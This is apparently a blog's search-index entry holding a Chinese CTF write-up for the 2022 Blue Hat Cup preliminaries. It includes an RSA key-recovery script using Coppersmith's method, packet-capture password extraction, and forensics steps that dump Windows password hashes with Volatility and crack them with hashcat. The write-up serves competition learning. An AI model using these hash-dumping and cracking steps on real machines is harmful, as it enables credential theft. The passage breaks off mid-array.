<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2022第六届蓝帽杯初赛部分wp</title>
    <url>/2022/07/11/2022%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
    <content><![CDATA[<h1 id="队伍名称"><a href="#队伍名称" class="headerlink" title="队伍名称"></a>队伍名称</h1><p><strong>我们会下蛊</strong></p>
<h1 id="排名"><a href="#排名" class="headerlink" title="排名"></a>排名</h1><p><img src="https://img-blog.csdnimg.cn/361848c3c8cf4fb6af523dfe46d9ed53.png" alt="图片">总排位：74名 东部赛区：29名</p>
<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ez-Gadget"><a href="#ez-Gadget" class="headerlink" title="ez_Gadget"></a>ez_Gadget</h3><p><a href="https://ameuu.github.io/2022/07/11/%E8%93%9D%E5%B8%BD%E6%9D%AF-EzGadget/">https://ameuu.github.io/2022/07/11/%E8%93%9D%E5%B8%BD%E6%9D%AF-EzGadget/</a></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="corrupted-key"><a href="#corrupted-key" class="headerlink" title="corrupted_key"></a>corrupted_key</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">key = RSA.generate(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;flag.enc&quot;</span>,<span class="string">&#x27;wb&#x27;</span>).write(PKCS1_OAEP.new(key.publickey()).encrypt(flag))</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;priv.pem&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(key.exportKey(<span class="string">&#x27;PEM&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIICXgIBAAKBgQDXFSUGqpzsBeUzXWtG9UkUB8MZn9UQkfH2Aw03YrngP0nJ3NwH</span><br><span class="line">UFTgzBSLl0tBhUvZO07haiqHbuYgBegO+Aa3qjtksb+bH6dz41PQzbn/l4Pd1fXm</span><br><span class="line">dJmtEPNh6TjQC4KmpMQqBTXF52cheY6GtFzUuNA7DX51wr6HZqHoQ73GQQIDAQAB</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">yQvOzxy6szWFheigQdGxAkEA4wFss2CcHWQ8FnQ5w7k4uIH0I38khg07HLhaYm1c</span><br><span class="line">zUcmlk4PgnDWxN+ev+vMU45O5eGntzaO3lHsaukX9461mA==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>参考<a href="https://zhuanlan.zhihu.com/p/461349946">pem解析</a></p>
<p>base64解码 再转hex</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">30</span> <span class="number">82</span> 02 5e 02 01 <span class="number">00</span> 02 <span class="number">81</span> <span class="number">81</span> <span class="number">00</span> d7 <span class="number">15</span> <span class="number">25</span> 06 aa 9c ec 05 e5 <span class="number">33</span> 5d 6b <span class="number">46</span> f5 <span class="number">49</span> <span class="number">14</span> 07 c3 <span class="number">19</span> 9f d5 <span class="number">10</span> <span class="number">91</span> f1 f6 03 0d <span class="number">37</span> <span class="number">62</span> b9 e0 3f <span class="number">49</span> c9 dc dc 07 <span class="number">50</span> <span class="number">54</span> e0 cc <span class="number">14</span> 8b <span class="number">97</span> 4b <span class="number">41</span> <span class="number">85</span> 4b d9 3b 4e e1 6a 2a <span class="number">87</span> 6e e6 <span class="number">20</span> 05 e8 0e f8 06 b7 aa 3b <span class="number">64</span> b1 bf 9b 1f a7 <span class="number">73</span> e3 <span class="number">53</span> d0 cd b9 ff <span class="number">97</span> <span class="number">83</span> dd d5 f5 e6 <span class="number">74</span> <span class="number">99</span> ad <span class="number">10</span> f3 <span class="number">61</span> e9 <span class="number">38</span> d0 0b <span class="number">82</span> a6 a4 c4 2a 05 <span class="number">35</span> c5 e7 <span class="number">67</span> <span class="number">21</span> <span class="number">79</span> 8e <span class="number">86</span> b4 5c d4 b8 d0 3b 0d 7e <span class="number">75</span> c2 be <span class="number">87</span> <span class="number">66</span> a1 e8 <span class="number">43</span> bd c6 <span class="number">41</span> 02 03 01 <span class="number">00</span> 01</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c9 0b ce cf 1c ba b3 <span class="number">35</span> <span class="number">85</span> <span class="number">85</span> e8 a0 <span class="number">41</span> d1 b1 02 <span class="number">41</span> <span class="number">00</span> e3 01 6c b3 <span class="number">60</span> 9c 1d <span class="number">64</span> 3c <span class="number">16</span> <span class="number">74</span> <span class="number">39</span> c3 b9 <span class="number">38</span> b8 <span class="number">81</span> f4 <span class="number">23</span> 7f <span class="number">24</span> <span class="number">86</span> 0d 3b 1c b8 5a <span class="number">62</span> 6d 5c cd <span class="number">47</span> <span class="number">26</span> <span class="number">96</span> 4e 0f <span class="number">82</span> <span class="number">70</span> d6 c4 df 9e bf eb cc <span class="number">53</span> 8e 4e e5 e1 a7 b7 <span class="number">36</span> 8e de <span class="number">51</span> ec 6a e9 <span class="number">17</span> f7 8e b5 <span class="number">98</span></span><br></pre></td></tr></table></figure>

<p>得到n和e还有dq的低120位和inv(q,p)</p>
<p>$e<em>dq=e</em>d=1 mod (q-1)$</p>
<p>$e<em>dq=1+k</em>(q-1)=k*q-k+1$</p>
<p>$e<em>dq+k-1=k</em>q$</p>
<p>k&lt;e的</p>
<p>那么</p>
<p>q的低120位</p>
<p>$q_{low}=inv(k,2<strong>120)<em>(e</em>dq+k-1)mod(2</strong>120)$</p>
<p>$q=2*<em>120</em>x+q_{los}$</p>
<p>$f=inv(q,p)<em>q</em>q-qmod n=0$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line">n=<span class="number">0xD7152506AA9CEC05E5335D6B46F5491407C3199FD51091F1F6030D3762B9E03F49C9DCDC075054E0CC148B974B41854BD93B4EE16A2A876EE62005E80EF806B7AA3B64B1BF9B1FA773E353D0CDB9FF9783DDD5F5E67499AD10F361E938D00B82A6A4C42A0535C5E76721798E86B45CD4B8D03B0D7E75C2BE8766A1E843BDC641</span></span><br><span class="line">ni=<span class="number">0xE3016CB3609C1D643C167439C3B938B881F4237F24860D3B1CB85A626D5CCD4726964E0F8270D6C4DF9EBFEBCC538E4EE5E1A7B7368EDE51EC6AE917F78EB598</span></span><br><span class="line">dd=<span class="number">0xC90BCECF1CBAB3358585E8A041D1B1</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">s=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">65537</span>)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tt=gmpy2.invert(i,<span class="number">2</span>**<span class="number">120</span>)*(e*dd+(i-<span class="number">1</span>))%<span class="number">2</span>**<span class="number">120</span></span><br><span class="line">        s.append(tt)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">PR.&lt;x&gt;=PolynomialRing(Zmod(n))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="built_in">len</span>(s))):</span><br><span class="line">    f=ni*(<span class="number">2</span>^<span class="number">120</span>*x+<span class="built_in">int</span>(s[i]))^<span class="number">2</span>-(<span class="number">2</span>^<span class="number">120</span>*x+<span class="built_in">int</span>(s[i]))</span><br><span class="line">    f=f.monic()</span><br><span class="line">    root=f.small_roots(X=<span class="number">2</span>^<span class="number">392</span>,beta=<span class="number">1</span>,epsilon=<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">if</span> root:</span><br><span class="line">        <span class="built_in">print</span>(root)</span><br><span class="line">        <span class="built_in">print</span>(s[i])</span><br><span class="line">[<span class="number">9380741476733074711154157347870852768998932500826815763908882209540022808328010581994168722390477477733053186137042700</span>]</span><br><span class="line"><span class="number">954648658690918505830691475676983889</span></span><br></pre></td></tr></table></figure>

<p>s倒着跑快一点</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"></span><br><span class="line">n=<span class="number">0xD7152506AA9CEC05E5335D6B46F5491407C3199FD51091F1F6030D3762B9E03F49C9DCDC075054E0CC148B974B41854BD93B4EE16A2A876EE62005E80EF806B7AA3B64B1BF9B1FA773E353D0CDB9FF9783DDD5F5E67499AD10F361E938D00B82A6A4C42A0535C5E76721798E86B45CD4B8D03B0D7E75C2BE8766A1E843BDC641</span></span><br><span class="line">x=<span class="number">9380741476733074711154157347870852768998932500826815763908882209540022808328010581994168722390477477733053186137042700</span></span><br><span class="line">s=<span class="number">954648658690918505830691475676983889</span></span><br><span class="line">q=<span class="number">2</span>^<span class="number">120</span>*x+s</span><br><span class="line"><span class="built_in">print</span>(n%q)</span><br><span class="line">p=n//q</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">d=inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.enc&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    c=bytes_to_long(f.read())</span><br><span class="line"></span><br><span class="line">key = RSA.construct((n, e, d, p, q))</span><br><span class="line">cipher = PKCS1_OAEP.new(key=key)</span><br><span class="line"><span class="built_in">print</span>(cipher.decrypt(long_to_bytes(c)))</span><br></pre></td></tr></table></figure>

<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="domainhacker"><a href="#domainhacker" class="headerlink" title="domainhacker"></a>domainhacker</h3><p>很典型的题目，先导出rar文件</p>
<p><img src="https://img-blog.csdnimg.cn/98a00c0cf865413ba4f02cd9fb8c96e8.png" alt="图片"></p>
<p>直接追踪到流13,先解码一下，然后选中[2:]，再去解码</p>
<p><img src="https://img-blog.csdnimg.cn/e000264c134e4cf7a03d4532bd41619e.png" alt="图片"></p>
<p>得到压缩包密码</p>
<p><img src="https://img-blog.csdnimg.cn/4edf6349bc204cb8978ac01c3cdd04f1.png" alt="图片"></p>
<p>解压，然后尝试一个，成功，就是flag</p>
<p><img src="https://img-blog.csdnimg.cn/1bf925b52d4e4ae7998c666092870248.png" alt="图片"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;416f89c3a5deb1d398a1a1fce93862a7&#125;</span><br></pre></td></tr></table></figure>

<h3 id="domainhacker2"><a href="#domainhacker2" class="headerlink" title="domainhacker2"></a>domainhacker2</h3><p>同上题，追踪到加密压缩包的流量，流27</p>
<p><img src="https://img-blog.csdnimg.cn/8d83cc84009740bab2a602914c2fb9b8.png" alt="图片"></p>
<p>然后解码一下得到压缩包密码，注意最后还要加上那个$符号</p>
<p><img src="https://img-blog.csdnimg.cn/7591ac2c6e6a459096524196534b2783.png" alt="图片"></p>
<p>解码之后读取之前所有的history值</p>
<p><img src="https://img-blog.csdnimg.cn/42ef08f41d254099983c39b0680bb584.png" alt="图片"></p>
<p>然后尝试几个密码就行，最后得到是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">07ab403ab740c1540c378b0f5aaa4087</span><br></pre></td></tr></table></figure>

<h2 id="电子取证"><a href="#电子取证" class="headerlink" title="电子取证"></a>电子取证</h2><p><img src="https://img-blog.csdnimg.cn/e950d1f5bf6040c68f7b630c4fd1d00a.png" alt="图片"></p>
<h3 id="手机取证-1"><a href="#手机取证-1" class="headerlink" title="手机取证_1"></a>手机取证_1</h3><p><img src="https://img-blog.csdnimg.cn/18f1acb781cc47e291bc91cf8f811775.png" alt="图片"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">360x360</span><br></pre></td></tr></table></figure>

<h3 id="手机取证-2"><a href="#手机取证-2" class="headerlink" title="手机取证_2"></a>手机取证_2</h3><p><img src="https://img-blog.csdnimg.cn/e690b4d93e8f40e086be4053f3aaafb4.png" alt="图片"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SF1142358694796</span><br></pre></td></tr></table></figure>

<h3 id="计算机取证-1"><a href="#计算机取证-1" class="headerlink" title="计算机取证_1"></a>计算机取证_1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 vol.py -f 1.dmp imageinfo 得到镜像版本Win7SP1x64</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/bc9d690633764221b6990a95400c00a2.jpeg" alt="图片"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 vol.py -f 1.dmp --profile=Win7SP1x64 hashdump hashdump查看密码的hash</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/57e679de3441401894f78d20541baffc.png" alt="图片"></p>
<p>拿去somd5解密得到密码</p>
<p><img src="https://img-blog.csdnimg.cn/453b24abc79a49ea91d0ddad5dfa219d.png" alt="图片"></p>
<h3 id="计算机取证-2"><a href="#计算机取证-2" class="headerlink" title="计算机取证_2"></a>计算机取证_2</h3><p><img src="https://img-blog.csdnimg.cn/9b8d14b52f124c828cf32839a9f02a79.png" alt="图片"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2192</span><br></pre></td></tr></table></figure>

<h3 id="计算机取证-3"><a href="#计算机取证-3" class="headerlink" title="计算机取证_3"></a>计算机取证_3</h3><p>用</p>
<p><img src="https://img-blog.csdnimg.cn/f62d49e096694ef8841c35387232c0fa.png" alt="图片"></p>
<p>然后解密秘钥</p>
<p><img src="https://img-blog.csdnimg.cn/ca6184b86ad1469ea83619cc680e57fd.png" alt="图片"></p>
<p>然后解锁，得到字典跟密文</p>
<p><img src="https://img-blog.csdnimg.cn/5f779b635dc743bdb6677cc7ce6f6561.png" alt="图片"></p>
<p>hashcat爆破</p>
<p><img src="https://img-blog.csdnimg.cn/560da10ef21e44d8aa62fae1a0eca232.png" alt="图片"></p>
<p><img src="https://img-blog.csdnimg.cn/f8dd7444f64a4a06a2db0e917504c350.png" alt="图片"></p>
<p><img src="https://img-blog.csdnimg.cn/49410a763a354720bd260090fd80c685.png" alt="图片"></p>
<h3 id="计算机取证-4"><a href="#计算机取证-4" class="headerlink" title="计算机取证_4"></a>计算机取证_4</h3><p>dump下TrueCrypt</p>
<p><img src="https://img-blog.csdnimg.cn/abc8ef88e50d42fda981b16e36a1596f.png" alt="图片"></p>
<p>然后foremost分解，里面有一个zip，没啥有用信息了，爆破一下</p>
<p><img src="https://img-blog.csdnimg.cn/e585f244f65e422bad71b36749e37191.png" alt="图片"></p>
<p><img src="https://img-blog.csdnimg.cn/2228be6a7681420bb5d0f881850f2384.png" alt="图片"></p>
<p>解压得到flag</p>
<p><img src="https://img-blog.csdnimg.cn/ea95742db379454fbe3fc0756729291c.png" alt="图片"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;1349934913913991394cacacacacacc&#125;</span><br></pre></td></tr></table></figure>

<h3 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析_1"></a>程序分析_1</h3><p><img src="https://img-blog.csdnimg.cn/019972169936407c95a74bb7b7b6f2c6.png" alt="图片"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec.azj.kny.d.c</span><br></pre></td></tr></table></figure>

<h3 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析_2"></a>程序分析_2</h3><p><img src="https://img-blog.csdnimg.cn/a91426d0c34343eba77925f1aaf00d28.png" alt="图片"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">minmtta.hemjcbm.ahibyws.MainActivity</span><br></pre></td></tr></table></figure>

<h3 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析_3"></a>程序分析_3</h3><p><img src="https://img-blog.csdnimg.cn/9b09a9cf81784bdba6a3cdaefcb1c992.png" alt="图片"></p>
<p>密文即是base64编码</p>
<h3 id="程序分析-4"><a href="#程序分析-4" class="headerlink" title="程序分析_4"></a>程序分析_4</h3><p><img src="https://img-blog.csdnimg.cn/1b9843e6ecee4c52adc1b87cd6154e9f.png" alt="图片"></p>
<p>简单分析一下，b(),a()是函数，a是类名，所以就单一个a</p>
<p><img src="https://img-blog.csdnimg.cn/368309f9ff5f43bd9fae31db5851200f.png" alt="图片"></p>
<h3 id="网站取证-1"><a href="#网站取证-1" class="headerlink" title="网站取证_1"></a>网站取证_1</h3><p>火绒扫一扫</p>
<p><img src="https://img-blog.csdnimg.cn/4167a00fc72b4e698b410148f0b99e0d.png" alt="图片"></p>
<p><img src="https://img-blog.csdnimg.cn/94896499fed2492c8946f8413dea02c7.png" alt="图片"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lanmaobei666</span><br></pre></td></tr></table></figure>

<h3 id="网站取证-2"><a href="#网站取证-2" class="headerlink" title="网站取证_2"></a>网站取证_2</h3><p><img src="https://img-blog.csdnimg.cn/554d135268ad4ad492d19fc87fb7d78b.png" alt="图片"></p>
<p>然后跟踪</p>
<p><img src="https://img-blog.csdnimg.cn/0b8d9b5901ff431baeb1d4724d985a3e.png" alt="图片"></p>
<p>找个7.1以下版本的php跑一下，因为7.1以上没有mcxxxxxx那个函数了</p>
<p><img src="https://img-blog.csdnimg.cn/d9869b5bf8fb4e81be56f4001c970f62.png" alt="图片"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">KBLT123</span><br></pre></td></tr></table></figure>

<h3 id="网站取证-3"><a href="#网站取证-3" class="headerlink" title="网站取证_3"></a>网站取证_3</h3><p><img src="https://img-blog.csdnimg.cn/21a40ec6dfec425995159b3f44c8e76b.png" alt="图片"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jyzg123456</span><br></pre></td></tr></table></figure>

<h3 id="网站取证-4"><a href="#网站取证-4" class="headerlink" title="网站取证_4"></a>网站取证_4</h3><p><img src="https://img-blog.csdnimg.cn/80b7d57e75c4472ab11327f33a71a3cc.png" alt="图片"></p>
<p>加密函数</p>
<p><img src="https://img-blog.csdnimg.cn/6eb66d21c72a4982bc1acaf13dbdd350.png" alt="图片"></p>
<p>张宝3，王子豪5，提取一下，先5后3</p>
<p><img src="https://img-blog.csdnimg.cn/fcc5c15b517949ce8fac59c1653e034f.png" alt="图片"></p>
<p>然后写解密脚本，要乘上每天的汇率</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#[[&#x27;mZVymm9t&#x27;, &#x27;lpxqlXFo&#x27;, &#x27;l5xummto&#x27;, &#x27;m5Zwm3Bn&#x27;, &#x27;nJhtlGlm&#x27;, &#x27;m5tpmGtm&#x27;, &#x27;m5ptnGtu&#x27;, &#x27;mZlym25r&#x27;, &#x27;m5hpnHBu&#x27;, &#x27;m5prlm9u&#x27;, &#x27;nJlyl2hu&#x27;, &#x27;lptummhs&#x27;, &#x27;lpxrl21n&#x27;], [&#x27;mZRpnHBs&#x27;, &#x27;mZpxm2lr&#x27;, &#x27;m5dtmGls&#x27;, &#x27;mpxvlnBv&#x27;, &#x27;mJpynHBt&#x27;, &#x27;nJZwm2lu&#x27;, &#x27;mpdtnWxq&#x27;, &#x27;nJdtlmpr&#x27;, &#x27;mZtymHBm&#x27;, &#x27;nJlslmpp&#x27;], [&#x27;l5RunW1p&#x27;, &#x27;nJxplXFm&#x27;, &#x27;lZdpmm1s&#x27;, &#x27;mZZwnW9u&#x27;, &#x27;mJVrmmhp&#x27;, &#x27;lZZwl3Bs&#x27;, &#x27;m5xvm2hm&#x27;, &#x27;mpZslmpm&#x27;, &#x27;mZtrnGtp&#x27;, &#x27;lp1rm21t&#x27;, &#x27;nJxplmtp&#x27;], [&#x27;l5twlXFq&#x27;, &#x27;lphqmm9s&#x27;, &#x27;m51wmG1q&#x27;, &#x27;mJlxlWto&#x27;, &#x27;lJ1vmXFq&#x27;, &#x27;mpVpmW5r&#x27;, &#x27;m5lrlGpr&#x27;, &#x27;mpxplm9u&#x27;, &#x27;lZpxnHFn&#x27;], [&#x27;nJdymWpm&#x27;, &#x27;mJpum3Fo&#x27;, &#x27;lpRrmWto&#x27;, &#x27;lZtunXBv&#x27;, &#x27;lpprnWtt&#x27;, &#x27;lJdslnBr&#x27;], [&#x27;lJZrnWpm&#x27;, &#x27;l5Zrm21m&#x27;, &#x27;lJdul2hm&#x27;, &#x27;mphylG9q&#x27;, &#x27;lZhpm2pp&#x27;, &#x27;lZ1qnW1s&#x27;, &#x27;nJ1tlHFp&#x27;, &#x27;mZxqm2tp&#x27;, &#x27;mZdsm21t&#x27;, &#x27;mpRvlG9o&#x27;, &#x27;mJVqlmhv&#x27;, &#x27;mJRwlHBq&#x27;], [&#x27;l5dtmWtt&#x27;, &#x27;mZdylHFt&#x27;, &#x27;l5RqlWxn&#x27;, &#x27;mZ1um3Fs&#x27;, &#x27;lJ1rnWhu&#x27;, &#x27;m5pulWhv&#x27;, &#x27;lptrnW1u&#x27;, &#x27;m5xynWxn&#x27;, &#x27;lpRynGtr&#x27;, &#x27;mpxulGlm&#x27;, &#x27;nJdslm9r&#x27;, &#x27;lJhslHBq&#x27;, &#x27;nJpwnWhu&#x27;], [&#x27;mptql2tv&#x27;, &#x27;l51xmmlp&#x27;, &#x27;mZVymXFn&#x27;, &#x27;lJhqnW5q&#x27;, &#x27;m5ppmGpr&#x27;, &#x27;mZlqm21t&#x27;, &#x27;mpZslWxt&#x27;], [&#x27;mJ1pnHFm&#x27;, &#x27;l5drlXBp&#x27;, &#x27;mJlvmW1u&#x27;, &#x27;mZtxlG5t&#x27;, &#x27;nJtsnHFn&#x27;, &#x27;l5Rvm29o&#x27;, &#x27;m5xvlWxv&#x27;, &#x27;m5Zrl2xm&#x27;], [&#x27;mZlwlG1u&#x27;, &#x27;nJpvlWtr&#x27;, &#x27;mJxym25s&#x27;, &#x27;lpVqnWxv&#x27;, &#x27;mZVvl3Fq&#x27;, &#x27;lZVtlW5m&#x27;, &#x27;lZRqlGhn&#x27;, &#x27;nJxqm2hn&#x27;, &#x27;nJVtl21s&#x27;], [&#x27;lJdumWlq&#x27;, &#x27;mJtxmGtp&#x27;, &#x27;mZxsnHFv&#x27;, &#x27;lpdtl2xn&#x27;, &#x27;mphqlm5p&#x27;, &#x27;lJdxlGpn&#x27;], [&#x27;lpVvlHFu&#x27;, &#x27;lJhvmHBn&#x27;, &#x27;l5xunGtv&#x27;, &#x27;lZRul2pt&#x27;, &#x27;mpdqnGxu&#x27;, &#x27;l5Zxlmho&#x27;, &#x27;lJppmWhq&#x27;, &#x27;nJVylWpp&#x27;, &#x27;m5VxnWlr&#x27;], [&#x27;lpdsnGtq&#x27;, &#x27;mZ1tnGpt&#x27;, &#x27;mJVqmmtq&#x27;, &#x27;l5hslWhm&#x27;, &#x27;lZZtl21r&#x27;, &#x27;nJlumGlm&#x27;, &#x27;lJhsmW9t&#x27;], [&#x27;lZZym25s&#x27;, &#x27;l5tpnHBt&#x27;, &#x27;nJVunG1q&#x27;, &#x27;mJdtlHFu&#x27;, &#x27;mpVtlnFp&#x27;, &#x27;mplrnG1t&#x27;, &#x27;mJ1ylHBr&#x27;, &#x27;nJhynG5m&#x27;, &#x27;mplymG1r&#x27;], [&#x27;lJtxlGxo&#x27;, &#x27;lpRxnGlm&#x27;, &#x27;mZxwnG5s&#x27;, &#x27;mZptnWpn&#x27;, &#x27;mJZylGxq&#x27;, &#x27;mZZvm3Fo&#x27;], [&#x27;lJdxnW9t&#x27;, &#x27;lZtxmXFv&#x27;, &#x27;nJxtlXFm&#x27;, &#x27;mJZumW1r&#x27;, &#x27;nJ1tmG1p&#x27;, &#x27;mplslmpu&#x27;, &#x27;lJZxlG5p&#x27;, &#x27;nJtxmXBq&#x27;], [&#x27;lZdxmmtq&#x27;, &#x27;lJdrlG1o&#x27;, &#x27;mpZtmmlm&#x27;, &#x27;mJVxnGpm&#x27;, &#x27;mJVwmWxu&#x27;, &#x27;mplslWps&#x27;]]#a=[0.04,0.06,0.05,0.07,0.10,0.15,0.17,0.23,0.22,0.25,0.29,0.20,0.28,0.33,0.35,0.35,0.37]import base64import hashlib</span><br><span class="line">def decryp(data):    key = b&#x27;jyzg123456&#x27;    key = hashlib.md5(key).hexdigest()    data = base64.b64decode(data)    x = 0    lenth = len(data)    l = len(key) char = &#x27;&#x27;    str = &#x27;&#x27; for i in range(lenth): if (x == l):            x = 0 char += key[x]        x += 1 for i in range(lenth): # print(data[i])        str += chr(data[i] - (ord(char[i])) % 256) return int(str)</span><br><span class="line">a1 = [[&#x27;mZVymm9t&#x27;, &#x27;lpxqlXFo&#x27;, &#x27;l5xummto&#x27;, &#x27;m5Zwm3Bn&#x27;, &#x27;nJhtlGlm&#x27;, &#x27;m5tpmGtm&#x27;, &#x27;m5ptnGtu&#x27;, &#x27;mZlym25r&#x27;, &#x27;m5hpnHBu&#x27;, &#x27;m5prlm9u&#x27;, &#x27;nJlyl2hu&#x27;, &#x27;lptummhs&#x27;, &#x27;lpxrl21n&#x27;], [&#x27;mZRpnHBs&#x27;, &#x27;mZpxm2lr&#x27;, &#x27;m5dtmGls&#x27;, &#x27;mpxvlnBv&#x27;, &#x27;mJpynHBt&#x27;, &#x27;nJZwm2lu&#x27;, &#x27;mpdtnWxq&#x27;, &#x27;nJdtlmpr&#x27;, &#x27;mZtymHBm&#x27;, &#x27;nJlslmpp&#x27;], [&#x27;l5RunW1p&#x27;, &#x27;nJxplXFm&#x27;, &#x27;lZdpmm1s&#x27;, &#x27;mZZwnW9u&#x27;, &#x27;mJVrmmhp&#x27;, &#x27;lZZwl3Bs&#x27;, &#x27;m5xvm2hm&#x27;, &#x27;mpZslmpm&#x27;, &#x27;mZtrnGtp&#x27;, &#x27;lp1rm21t&#x27;, &#x27;nJxplmtp&#x27;], [&#x27;l5twlXFq&#x27;, &#x27;lphqmm9s&#x27;, &#x27;m51wmG1q&#x27;, &#x27;mJlxlWto&#x27;, &#x27;lJ1vmXFq&#x27;, &#x27;mpVpmW5r&#x27;, &#x27;m5lrlGpr&#x27;, &#x27;mpxplm9u&#x27;, &#x27;lZpxnHFn&#x27;], [&#x27;nJdymWpm&#x27;, &#x27;mJpum3Fo&#x27;, &#x27;lpRrmWto&#x27;, &#x27;lZtunXBv&#x27;, &#x27;lpprnWtt&#x27;, &#x27;lJdslnBr&#x27;], [&#x27;lJZrnWpm&#x27;, &#x27;l5Zrm21m&#x27;, &#x27;lJdul2hm&#x27;, &#x27;mphylG9q&#x27;, &#x27;lZhpm2pp&#x27;, &#x27;lZ1qnW1s&#x27;, &#x27;nJ1tlHFp&#x27;, &#x27;mZxqm2tp&#x27;, &#x27;mZdsm21t&#x27;, &#x27;mpRvlG9o&#x27;, &#x27;mJVqlmhv&#x27;, &#x27;mJRwlHBq&#x27;], [&#x27;l5dtmWtt&#x27;, &#x27;mZdylHFt&#x27;, &#x27;l5RqlWxn&#x27;, &#x27;mZ1um3Fs&#x27;, &#x27;lJ1rnWhu&#x27;, &#x27;m5pulWhv&#x27;, &#x27;lptrnW1u&#x27;, &#x27;m5xynWxn&#x27;, &#x27;lpRynGtr&#x27;, &#x27;mpxulGlm&#x27;, &#x27;nJdslm9r&#x27;, &#x27;lJhslHBq&#x27;, &#x27;nJpwnWhu&#x27;], [&#x27;mptql2tv&#x27;, &#x27;l51xmmlp&#x27;, &#x27;mZVymXFn&#x27;, &#x27;lJhqnW5q&#x27;, &#x27;m5ppmGpr&#x27;, &#x27;mZlqm21t&#x27;, &#x27;mpZslWxt&#x27;], [&#x27;mJ1pnHFm&#x27;, &#x27;l5drlXBp&#x27;, &#x27;mJlvmW1u&#x27;, &#x27;mZtxlG5t&#x27;, &#x27;nJtsnHFn&#x27;, &#x27;l5Rvm29o&#x27;, &#x27;m5xvlWxv&#x27;, &#x27;m5Zrl2xm&#x27;], [&#x27;mZlwlG1u&#x27;, &#x27;nJpvlWtr&#x27;, &#x27;mJxym25s&#x27;, &#x27;lpVqnWxv&#x27;, &#x27;mZVvl3Fq&#x27;, &#x27;lZVtlW5m&#x27;, &#x27;lZRqlGhn&#x27;, &#x27;nJxqm2hn&#x27;, &#x27;nJVtl21s&#x27;], [&#x27;lJdumWlq&#x27;, &#x27;mJtxmGtp&#x27;, &#x27;mZxsnHFv&#x27;, &#x27;lpdtl2xn&#x27;, &#x27;mphqlm5p&#x27;, 